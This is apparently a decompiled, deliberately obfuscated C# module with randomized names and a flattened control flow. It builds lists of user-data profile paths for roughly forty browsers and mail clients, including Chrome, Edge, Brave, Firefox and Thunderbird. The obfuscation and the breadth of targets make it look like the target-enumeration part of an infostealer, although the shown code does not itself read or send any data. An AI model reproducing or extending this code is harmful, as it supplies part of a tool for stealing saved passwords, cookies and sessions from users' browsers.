using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;

namespace p3N5Y;

internal class fAUNhG4wfK
{
	public class VA9
	{
		[CompilerGenerated]
		private string ApplicationName__BackingField;

		[CompilerGenerated]
		private string Path__BackingField;

		[CompilerGenerated]
		private bool IsEnabled__BackingField;

		public string Xj2aIKPsZBi
		{
			[CompilerGenerated]
			get
			{
				return ApplicationName__BackingField;
			}
			[CompilerGenerated]
			set
			{
				ApplicationName__BackingField = value;
			}
		}

		public string UGX78vp8rG6
		{
			[CompilerGenerated]
			get
			{
				return Path__BackingField;
			}
			[CompilerGenerated]
			set
			{
				Path__BackingField = value;
			}
		}

		public bool f1yuVL
		{
			[CompilerGenerated]
			get
			{
				return IsEnabled__BackingField;
			}
			[CompilerGenerated]
			set
			{
				IsEnabled__BackingField = value;
			}
		}

		public VA9(string _app, string _path, bool _enabled)
		{
			Xj2aIKPsZBi = _app;
			UGX78vp8rG6 = _path;
			f1yuVL = _enabled;
		}
	}

	private static readonly string LocalApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

	private static readonly string SystemAppdataPath = Environment.GetEnvironmentVariable("APPDATA");

	public static List<VA9> ChromiumBrowserList = new List<VA9>();

	public static List<VA9> MozillaBrowserList = new List<VA9>();

	public static void kD9QZnGcP()
	{
		int num = 0;
		do
		{
			if (num == 26)
			{
				ChromiumBrowserList.Add(new VA9("Coowon", Path.Combine(LocalApp, "Coowon\\Coowon\\User Data"), Convert.ToBoolean("true")));
				num = 27;
			}
			if (num == 23)
			{
				ChromiumBrowserList.Add(new VA9("Coccoc", Path.Combine(LocalApp, "CocCoc\\Browser\\User Data"), Convert.ToBoolean("true")));
				num = 24;
			}
			if (num == 6)
			{
				ChromiumBrowserList.Add(new VA9("Torch Browser", Path.Combine(LocalApp, "Torch\\User Data"), Convert.ToBoolean("true")));
				num = 7;
			}
			if (num == 8)
			{
				ChromiumBrowserList.Add(new VA9("Kometa", Path.Combine(LocalApp, "Kometa\\User Data"), Convert.ToBoolean("true")));
				num = 9;
			}
			if (num == 40)
			{
				MozillaBrowserList.Add(new VA9("Flock", SystemAppdataPath + "\\Flock\\Browser\\", Convert.ToBoolean("true")));
				num = 41;
			}
			if (num == 36)
			{
				MozillaBrowserList.Add(new VA9("PaleMoon", SystemAppdataPath + "\\Moonchild Productions\\Pale Moon\\", Convert.ToBoolean("true")));
				num = 37;
			}
			if (num == 28)
			{
				ChromiumBrowserList.Add(new VA9("Edge Chromium", Path.Combine(LocalApp, "Microsoft\\Edge\\User Data"), Convert.ToBoolean("true")));
				num = 29;
			}
			if (num == 13)
			{
				ChromiumBrowserList.Add(new VA9("Orbitum", Path.Combine(LocalApp, "Orbitum\\User Data"), Convert.ToBoolean("true")));
				num = 14;
			}
			if (num == 34)
			{
				MozillaBrowserList.Add(new VA9("K-Meleon", SystemAppdataPath + "\\K-Meleon\\", Convert.ToBoolean("true")));
				num = 35;
			}
			if (num == 39)
			{
				MozillaBrowserList.Add(new VA9("Postbox", SystemAppdataPath + "\\Postbox\\", Convert.ToBoolean("true")));
				num = 40;
			}
			if (num == 21)
			{
				ChromiumBrowserList.Add(new VA9("Elements Browser", Path.Combine(LocalApp, "Elements Browser\\User Data"), Convert.ToBoolean("true")));
				num = 22;
			}
			if (num == 27)
			{
				ChromiumBrowserList.Add(new VA9("Chrome", Path.Combine(LocalApp, "Google\\Chrome\\User Data"), Convert.ToBoolean("true")));
				num = 28;
			}
			if (num == 14)
			{
				ChromiumBrowserList.Add(new VA9("Sputnik", Path.Combine(LocalApp, "Sputnik\\Sputnik\\User Data"), Convert.ToBoolean("true")));
				num = 15;
			}
			if (num == 2)
			{
				ChromiumBrowserList.Add(new VA9("Yandex Browser", Path.Combine(LocalApp, "Yandex\\YandexBrowser\\User Data"), Convert.ToBoolean("true")));
				num = 3;
			}
			if (num == 38)
			{
				MozillaBrowserList.Add(new VA9("WaterFox", SystemAppdataPath + "\\Waterfox\\", Convert.ToBoolean("true")));
				num = 39;
			}
			if (num == 1)
			{
				ChromiumBrowserList.Add(new VA9("Opera Browser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable"), Convert.ToBoolean("true")));
				num = 2;
			}
			if (num == 19)
			{
				ChromiumBrowserList.Add(new VA9("Uran", Path.Combine(LocalApp, "uCozMedia\\Uran\\User Data"), Convert.ToBoolean("true")));
				num = 20;
			}
			if (num == 16)
			{
				ChromiumBrowserList.Add(new VA9("Vivaldi", Path.Combine(LocalApp, "Vivaldi\\User Data"), Convert.ToBoolean("true")));
				num = 17;
			}
			if (num == 33)
			{
				MozillaBrowserList.Add(new VA9("CyberFox", SystemAppdataPath + "\\8pecxstudios\\Cyberfox\\", Convert.ToBoolean("true")));
				num = 34;
			}
			if (num == 24)
			{
				ChromiumBrowserList.Add(new VA9("Sleipnir 6", Path.Combine(LocalApp, "Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"), Convert.ToBoolean("true")));
				num = 25;
			}
			if (num == 4)
			{
				ChromiumBrowserList.Add(new VA9("Chromium", Path.Combine(LocalApp, "Chromium\\User Data"), Convert.ToBoolean("true")));
				num = 5;
			}
			if (num == 18)
			{
				ChromiumBrowserList.Add(new VA9("360 Browser", Path.Combine(LocalApp, "360Chrome\\Chrome\\User Data"), Convert.ToBoolean("true")));
				num = 19;
			}
			if (num == 31)
			{
				MozillaBrowserList.Add(new VA9("Thunderbird", SystemAppdataPath + "\\Thunderbird\\", Convert.ToBoolean("true")));
				num = 32;
			}
			if (num == 20)
			{
				ChromiumBrowserList.Add(new VA9("Liebao Browser", Path.Combine(LocalApp, "liebao\\User Data"), Convert.ToBoolean("true")));
				num = 21;
			}
			if (num == 35)
			{
				MozillaBrowserList.Add(new VA9("IceCat", SystemAppdataPath + "\\Mozilla\\icecat\\", Convert.ToBoolean("true")));
				num = 36;
			}
			if (num == 12)
			{
				ChromiumBrowserList.Add(new VA9("Chedot", Path.Combine(LocalApp, "Chedot\\User Data"), Convert.ToBoolean("true")));
				num = 13;
			}
			if (num == 25)
			{
				ChromiumBrowserList.Add(new VA9("QIP Surf", Path.Combine(LocalApp, "QIP Surf\\User Data"), Convert.ToBoolean("true")));
				num = 26;
			}
			if (num == 37)
			{
				MozillaBrowserList.Add(new VA9("IceDragon", SystemAppdataPath + "\\Comodo\\IceDragon\\", Convert.ToBoolean("true")));
				num = 38;
			}
			if (num == 7)
			{
				ChromiumBrowserList.Add(new VA9("Cool Novo", Path.Combine(LocalApp, "MapleStudio\\ChromePlus\\User Data"), Convert.ToBoolean("true")));
				num = 8;
			}
			if (num == 5)
			{
				ChromiumBrowserList.Add(new VA9("7Star", Path.Combine(LocalApp, "7Star\\7Star\\User Data"), Convert.ToBoolean("true")));
				num = 6;
			}
			if (num == 30)
			{
				MozillaBrowserList.Add(new VA9("SeaMonkey", SystemAppdataPath + "\\Mozilla\\SeaMonkey\\", Convert.ToBoolean("true")));
				num = 31;
			}
			if (num == 32)
			{
				MozillaBrowserList.Add(new VA9("BlackHawk", SystemAppdataPath + "\\NETGATE Technologies\\BlackHawk\\", Convert.ToBoolean("true")));
				num = 33;
			}
			if (num == 3)
			{
				ChromiumBrowserList.Add(new VA9("Iridium Browser", Path.Combine(LocalApp, "Iridium\\User Data"), Convert.ToBoolean("true")));
				num = 4;
			}
			if (num == 9)
			{
				ChromiumBrowserList.Add(new VA9("Amigo", Path.Combine(LocalApp, "Amigo\\User Data"), Convert.ToBoolean("true")));
				num = 10;
			}
			if (num == 22)
			{
				ChromiumBrowserList.Add(new VA9("Epic Privacy", Path.Combine(LocalApp, "Epic Privacy Browser\\User Data"), Convert.ToBoolean("true")));
				num = 23;
			}
			if (num == 10)
			{
				ChromiumBrowserList.Add(new VA9("Brave", Path.Combine(LocalApp, "BraveSoftware\\Brave-Browser\\User Data"), Convert.ToBoolean("true")));
				num = 11;
			}
			if (num == 17)
			{
				ChromiumBrowserList.Add(new VA9("Citrio", Path.Combine(LocalApp, "CatalinaGroup\\Citrio\\User Data"), Convert.ToBoolean("true")));
				num = 18;
			}
			if (num == 29)
			{
				MozillaBrowserList.Add(new VA9("Firefox", SystemAppdataPath + "\\Mozilla\\Firefox\\", Convert.ToBoolean("true")));
				num = 30;
			}
			if (num == 11)
			{
				ChromiumBrowserList.Add(new VA9("CentBrowser", Path.Combine(LocalApp, "CentBrowser\\User Data"), Convert.ToBoolean("true")));
				num = 12;
			}
			if (num == 15)
			{
				ChromiumBrowserList.Add(new VA9("Comodo Dragon", Path.Combine(LocalApp, "Comodo\\Dragon\\User Data"), Convert.ToBoolean("true")));
				num = 16;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 41);
	}
}
